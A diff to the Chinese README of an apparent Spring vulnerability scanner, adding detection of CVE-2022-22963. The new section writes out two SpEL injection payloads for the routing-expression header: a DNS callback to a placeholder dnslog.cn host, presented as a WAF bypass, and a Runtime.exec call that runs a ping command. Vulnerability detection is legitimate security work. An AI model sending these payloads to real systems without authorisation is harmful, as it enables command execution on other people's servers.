@@ -3,7 +3,7 @@
 ## 支持检测漏洞
 
 - [x] Spring Core RCE (**CVE-2022-22965**)
-- [ ] Spring Cloud Function SpEL RCE (**CVE-2022-22963**)
+- [x] Spring Cloud Function SpEL RCE (**CVE-2022-22963**)
 - [ ] Spring Cloud GateWay SPEL RCE (**CVE-2022-22947**)
 
 ## 回连平台
@@ -33,6 +33,17 @@
 > 回连检测 > 报错检测
 
 报错检测误报率较大，可能存在漏洞但不能保证JDK版本大于等于**9**，可以及时捕捉到不出网的漏洞；回连检测准确率高，不适用于不出网环境。
+
+### CVE-2022-22963 检测方法 
+
+利用条件
+
+* 默认路由`/functionRouter`存在SpEL表达式注入
+
+两种检测方法：
+
+* 通过Java自带InetAddres库`spring.cloud.function.routing-expression:T(java.net.InetAddress).getByName("xxx.dnslog.cn")`回连探测（可绕过WAF拦截命令执行）
+* 通过执行ping命令`spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec("ping xxx.dnslog.cn")`回连探测
 
 ## 编译
 
